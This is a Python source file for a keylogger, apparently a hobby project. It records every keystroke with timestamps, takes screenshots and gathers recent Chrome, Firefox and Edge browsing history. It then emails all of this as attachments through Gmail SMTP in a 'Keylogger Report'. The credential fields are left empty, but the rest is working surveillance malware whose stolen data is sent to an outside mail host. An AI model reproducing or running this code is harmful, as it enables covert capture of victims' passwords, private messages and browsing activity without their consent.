import os
import time
import datetime
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from PIL import ImageGrab 
from browser_history.browsers import Chrome, Firefox, Edge
import keyboard

log_file = "D:\\Code\\keylogger_project\\advancekeylog\\files\\logfile.txt"
screenshot_dir = "D:\\Code\\keylogger_project\\advancekeylog\\files\\screenshots"
history_file = "D:\\Code\\keylogger_project\\advancekeylog\\files\\history.txt"
last_sent_file = "D:\\Code\\keylogger_project\\advancekeylog\\files\\last_sent.txt"

# Email credentials and recipients
sender = ''
receivers = ['']
password = ''
stop_keylogger = False

# Ensure the screenshot directory exists
os.makedirs(screenshot_dir, exist_ok=True)

def read_last_sent_data():
    if os.path.exists(last_sent_file):
        with open(last_sent_file, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read().splitlines()
    return []

def write_last_sent_data(data):
    with open(last_sent_file, 'w', errors='ignore') as f:
        f.write("\n".join(data))

def get_current_data():
    data = []
    if os.path.exists(log_file):
        with open(log_file, 'r',  encoding='utf-8', errors='ignore') as f:
            data.append(f.read())
    if os.path.exists(history_file):
        with open(history_file, 'r', encoding='utf-8', errors='ignore') as f:
            data.append(f.read())
    for screenshot_file in os.listdir(screenshot_dir):
        file_path = os.path.join(screenshot_dir, screenshot_file)
        if os.path.isfile(file_path):
            data.append(screenshot_file)
    return data

def get_new_data(current_data, last_sent_data):
    new_data = [item for item in current_data if item not in last_sent_data]
    return new_data

def send_email():
    current_data = get_current_data()
    last_sent_data = read_last_sent_data()
    new_data = get_new_data(current_data, last_sent_data)

    if not new_data:
        print("No new data to send.")
        return

    # Create the multipart message
    message = MIMEMultipart()
    message['From'] = sender
    message['To'] = ", ".join(receivers)
    message['Subject'] = 'Keylogger Report'

    # Add body to the email
    body = "This is a test e-mail message with a logfile, screenshots, and browser history attached."
    message.attach(MIMEText(body, 'plain'))

    # Attach new log file data
    if os.path.exists(log_file):
        with open(log_file, "r", encoding='utf-8', errors='ignore') as f:
            log_data = f.read()
        if log_data in new_data:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(log_data.encode())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(log_file)}")
            message.attach(part)

    # Attach new screenshot files
    for screenshot_file in new_data:
        file_path = os.path.join(screenshot_dir, screenshot_file)
        if os.path.isfile(file_path):
            try:
                with open(file_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {screenshot_file}")
                message.attach(part)
            except Exception as e:
                print(f"Failed to attach {file_path}: {e}")

    # Attach new browser history data
    if os.path.exists(history_file):
        with open(history_file, "r", encoding='utf-8', errors='ignore') as f:
            history_data = f.read()
        if history_data in new_data:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(history_data.encode())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(history_file)}")
            message.attach(part)

    try:
        smtpObj = smtplib.SMTP("smtp.gmail.com", 587)
        smtpObj.ehlo()
        smtpObj.starttls()
        smtpObj.ehlo()
        smtpObj.login(sender, password)
        smtpObj.sendmail(sender, receivers, message.as_string())
        smtpObj.quit()
        print("Successfully sent email")
        write_last_sent_data(current_data)
    except smtplib.SMTPException as e:
        print(f"Failed to send email: {e}")

def capture_screenshot():
    try:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot_file = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_file)
        print(f"Screenshot saved")
    except Exception as e:
        print(f"Failed to capture screenshot: {e}")

def log_browser_history():
    try:
        current_time = datetime.datetime.now()
        time_threshold = current_time - datetime.timedelta(hours=24)  # Adjust the time range as needed
        c = Chrome()
        f = Firefox()
        e = Edge()

        c_history = c.fetch_history().histories
        f_history = f.fetch_history().histories
        e_history = e.fetch_history().histories
        
        combined_history = c_history + f_history + e_history
        filtered_history = [entry for entry in combined_history if entry[0].replace(tzinfo=None) >= time_threshold]

        with open(history_file, 'w', encoding='utf-8', errors='ignore') as f:
            f.write("Browser: Combined History\n")  # We don't have separate browser info in this version
            for entry in filtered_history:
                timestamp, url, title = entry[:3]
                f.write(f"URL: {url}\nTimestamp: {timestamp}\nTitle: {title}\n\n")
            f.write("\n")

        print(f"Browser history saved")
        
    except Exception as e:
        print(f"Error in log_browser_history: {e}")

def on_key_press(event):
    global stop_keylogger

    # Handling the 'esc' Key
    if event.name == 'esc':
        log_browser_history()
        send_email()

    # Handling the 'ctrl+shift+esc' Key Combination
    elif event.name == 'f2':
        stop_keylogger = True
        print("stopped.")
        keyboard.unhook_all()

    # Handling the 'print screen' Key for capturing screenshots
    elif event.name == 's' and keyboard.is_pressed('ctrl'):
        print("screenshot captured.")
        capture_screenshot()

    # Logging Keystrokes
    else:
        with open(log_file, 'a', encoding='utf-8') as f:
            if event.name == 'space':
                f.write(' ')
            elif event.name == 'enter':
                f.write('\n')
            elif event.name == 'backspace':
                f.write('backspace\n')
            else:
                event_time = datetime.datetime.fromtimestamp(event.time).strftime('%Y-%m-%d %H:%M:%S')
                # Use event.name.encode to handle non-ASCII characters
                encoded_name = event.name.encode('utf-8', 'replace').decode('utf-8')
                f.write(f"{event_time} - {encoded_name}\n") 

def start_keylogger():
    global stop_keylogger
    keyboard.on_press(on_key_press)  # Start logging keys
    def history_thread():
        while not stop_keylogger:
            log_browser_history()
            time.sleep(3*60*60)
    threading.Thread(target=history_thread, daemon=True).start()

    # Continue logging until stop_keylogger is True
    while not stop_keylogger:
        # Sleep briefly to prevent high CPU usage
        threading.Event().wait(0.1)

if __name__ == "__main__":
    # Start logging and automated email sending
    start_keylogger()
